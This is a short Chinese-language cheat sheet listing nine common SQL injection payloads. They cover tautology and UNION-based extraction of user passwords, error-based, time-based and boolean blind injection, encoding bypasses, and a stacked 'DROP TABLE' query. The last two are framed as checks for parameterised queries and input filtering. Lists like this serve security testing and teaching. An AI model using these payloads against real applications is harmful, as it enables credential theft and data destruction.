# 常见SQL注入手法

1. 基本 SQL 注入: `' OR '1'='1`
2. 联合查询注入: `' UNION SELECT username, password FROM users --`
3. 报错注入: `' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1))) --`
4. 时间盲注: `' AND IF(1=1, SLEEP(5), 0) --`
5. 布尔盲注: `' AND (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --`
6. URL 编码绕过: `%27 OR 1=1 --`
7. 十六进制编码绕过: `0x27 OR 1=1 --`
8. 参数化查询验证: `user'input; DROP TABLE comments; --`
9. 输入过滤验证: `admin'; --`
